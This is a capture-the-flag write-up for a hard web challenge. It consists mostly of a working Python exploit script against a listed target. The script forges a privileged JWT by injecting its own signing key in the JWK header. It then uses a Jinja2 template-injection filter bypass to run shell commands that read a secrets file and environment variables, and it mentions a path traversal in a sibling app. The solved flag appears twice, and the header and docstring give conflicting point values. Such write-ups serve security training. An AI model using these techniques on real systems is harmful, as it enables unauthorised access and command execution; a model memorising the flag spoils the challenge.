---
title: "Citrus Proof"
ctf: "Safaricom CTF"
date: 2026-10-04
category: web
difficulty: hard
points: 750
flag_format: "safctf{...}"
author: "safaricom-ctf-team"
---

# Citrus Proof

## Summary

- **Target:** `http://54.72.82.22:8320` — Werkzeug/3.1.9, Python/3.11.16, Flask (dev server)

## Solution

### Step 1: Run the solve script:

```python
#!/usr/bin/env python3
"""Citrus Proof - WEB, 550 pts - SOLVED.

Target: http://54.72.82.22:8320   (Werkzeug/3.1.9, Python 3.11.16, Flask)

Flag: safctf{83f575a861a0c69d675d700dcb658cd2}

The role gate is NOT a secret-cracking problem.  The organizer runtime leaks the
whole framework in the sibling desk app Touchline Dispatch (:8300), whose
path-traversal reads /app/service.py:

    def claims():
        token = request.headers.get('Authorization','').removeprefix('Bearer ')
        h,p,s = token.split('.')
        head  = json.loads(unb64(h))
        key   = unb64(head['jwk']['k']) if 'jwk' in head else b'front-desk'   # <-- pick your own key
        if not hmac.compare_digest(unb64(s), hmac.new(key,(h+'.'+p).encode(),sha256).digest()):
            raise ValueError('signature')
        return json.loads(unb64(p))

Put {"jwk":{"k":<b64 key>}} in the JWT header and sign with that key -> a fully
"valid" {"role":"curator"} token (JWK header injection / self-signed JWT).

    kind == 'web-render':
        op == 'session' -> issue({'role':'visitor'})            # constant visitor token
        op == 'proof'   -> role must be 'curator', then render_template_string(layout),
                           rejecting layouts containing any of '_' '[' ']'

So /api/proof is a Jinja2 SSTI once curator.  The '_' filter is dodged by pulling
the attribute name and the command from the query string (query args are not
filtered) and using |attr():
    {{lipsum|attr(request.args.g)|attr('get')(request.args.m)|attr(request.args.f)(request.args.c)|attr('read')()}}
with ?g=__globals__&m=os&f=popen&c=<cmd>  -> root RCE.

FLAG lives in the env of the container (FLAG=...) and is also written to
/app/private/reserve.txt at startup (service.py does that for web-path/web-render).

NOTE: POST /submit is a decoy on this challenge.  /submit compares
sha256(answer) to cfg['answer_hash'], but Citrus Proof's /app/settings.json has no
'answer_hash' key, so the fallback '!' can never match -- /submit returns 403 for
every input by construction.  The env/reserve.txt value IS the flag.
"""
import base64, hashlib, hmac, json, sys, urllib.parse, urllib.request, urllib.error

BASE = "http://54.72.82.22:8320"
EXPECT = "safctf{83f575a861a0c69d675d700dcb658cd2}"

def b64(b): return base64.urlsafe_b64encode(b).decode().rstrip("=")

def req(method, path, body=None, token=None, params=None):
    url = BASE + path
    if params:
        url += "?" + urllib.parse.urlencode(params)
    data = body.encode() if isinstance(body, str) else body
    h = {"Content-Type": "application/json"}
    if token:
        h["Authorization"] = "Bearer " + token
    r = urllib.request.Request(url, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")

def forge(role="curator", key=b"pwn"):
    """JWK-header key injection: the server trusts the key we put in the header."""
    head = {"alg": "HS256", "typ": "JWT", "jwk": {"k": b64(key)}}
    h = b64(json.dumps(head).encode())
    p = b64(json.dumps({"role": role}).encode())
    s = b64(hmac.new(key, (h + "." + p).encode(), hashlib.sha256).digest())
    return h + "." + p + "." + s

SSTI = ("{{lipsum|attr(request.args.g)|attr('get')(request.args.m)"
        "|attr(request.args.f)(request.args.c)|attr('read')()}}")

def run(cur, cmd):
    st, txt = req("POST", "/api/proof", json.dumps({"layout": SSTI}), cur,
                  {"g": "__globals__", "m": "os", "f": "popen", "c": cmd})
    if st == 200:
        return json.loads(txt).get("proof", "")
    return None

def main():
    cur = forge()
    st, txt = req("POST", "/api/proof", '{"layout":"{{7*7}}"}', cur)
    print("[*] forged curator, {{7*7}} ->", st, txt.strip())
    assert st == 200 and "49" in txt, "jwk forgery failed"

    out = run(cur, "cat /app/private/reserve.txt")
    flag = out.strip() if out else ""
    print("[*] /app/private/reserve.txt ->", repr(flag))
    if "safctf{" not in flag:
        env = run(cur, "printenv FLAG") or ""
        m = env.strip()
        flag = m[m.index("safctf{"):].split("}")[0] + "}" if "safctf{" in m else ""
        print("[*] env FLAG ->", repr(flag))

    print("[+] FLAG:", flag)
    assert flag == EXPECT, f"unexpected flag {flag!r}"

# ... (truncated)
```

## Flag

```
safctf{83f575a861a0c69d675d700dcb658cd2}
```
